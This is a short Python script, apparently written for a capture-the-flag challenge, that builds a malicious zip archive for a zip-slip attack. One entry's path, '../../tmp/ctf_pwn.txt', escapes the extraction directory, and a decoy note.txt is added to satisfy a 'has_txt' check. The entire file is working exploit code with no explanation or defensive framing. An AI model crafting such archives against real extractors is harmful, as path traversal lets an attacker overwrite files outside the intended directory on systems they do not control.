import zipfile

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr("../../tmp/ctf_pwn.txt", "pwned by zip traversal")
    z.writestr("note.txt", "ok")  # ensures has_txt True
print("created exploit.zip")
